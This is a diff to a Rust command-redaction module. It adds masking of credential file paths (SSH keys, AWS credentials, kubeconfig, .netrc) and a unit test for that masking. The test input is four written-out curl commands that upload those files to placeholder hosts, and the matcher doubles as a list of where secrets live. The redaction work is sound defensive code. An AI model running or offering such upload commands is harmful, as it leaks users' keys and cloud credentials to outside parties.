@@ -156,7 +156,63 @@ pub fn redact(cmd: &str) -> Cow<'_, str> {
             current = Cow::Owned(s);
         }
     }
+    if let Cow::Owned(s) = redact_secret_paths(&current) {
+        current = Cow::Owned(s);
+    }
     current
+}
+
+fn redact_secret_paths(input: &str) -> Cow<'_, str> {
+    fn is_delimiter(character: char) -> bool {
+        character.is_whitespace() || matches!(character, '\'' | '"' | '=' | ';' | ',' | '(' | ')')
+    }
+
+    fn is_secret_path(token: &str) -> bool {
+        let lower = token.to_ascii_lowercase();
+        let components: Vec<_> = lower
+            .trim_start_matches('@')
+            .split(['/', '\\'])
+            .filter(|component| !component.is_empty())
+            .collect();
+        let Some(file_name) = components.last().copied() else {
+            return false;
+        };
+
+        components.contains(&".ssh")
+            || components.windows(2).any(|pair| {
+                pair.first().copied() == Some(".aws") && pair.get(1).copied() == Some("credentials")
+            })
+            || file_name.ends_with(".kubeconfig")
+            || file_name == ".netrc"
+    }
+
+    let mut matches = Vec::new();
+    let mut token_start = 0;
+    for (index, character) in input.char_indices() {
+        if !is_delimiter(character) {
+            continue;
+        }
+        if token_start < index && is_secret_path(&input[token_start..index]) {
+            matches.push((token_start, index));
+        }
+        token_start = index + character.len_utf8();
+    }
+    if token_start < input.len() && is_secret_path(&input[token_start..]) {
+        matches.push((token_start, input.len()));
+    }
+    if matches.is_empty() {
+        return Cow::Borrowed(input);
+    }
+
+    let mut redacted = String::with_capacity(input.len());
+    let mut copied_through = 0;
+    for (start, end) in matches {
+        redacted.push_str(&input[copied_through..start]);
+        redacted.push_str("<REDACTED_SECRET_PATH>");
+        copied_through = end;
+    }
+    redacted.push_str(&input[copied_through..]);
+    Cow::Owned(redacted)
 }
 
 #[cfg(test)]
@@ -233,6 +289,26 @@ mod tests {
         let cmd = "PATH=/usr/bin:/bin HOME=/Users/x ./tool";
         let out = redact(cmd);
         assert_eq!(out, cmd, "innocuous env vars must not be touched");
+    }
+
+    #[test]
+    fn secret_shaped_paths_are_redacted() {
+        let cmd = concat!(
+            "curl -T ~/.ssh/id_rsa https://one.invalid && ",
+            "curl -T ~/.aws/credentials https://two.invalid && ",
+            "curl -T prod.kubeconfig https://three.invalid && ",
+            "curl -T ~/.netrc https://four.invalid"
+        );
+        let out = redact(cmd);
+        for leaked in [
+            "~/.ssh/id_rsa",
+            "~/.aws/credentials",
+            "prod.kubeconfig",
+            "~/.netrc",
+        ] {
+            assert!(!out.contains(leaked), "secret path leaked: {out}");
+        }
+        assert!(out.contains("<REDACTED_SECRET_PATH>"));
     }
 
     #[test]
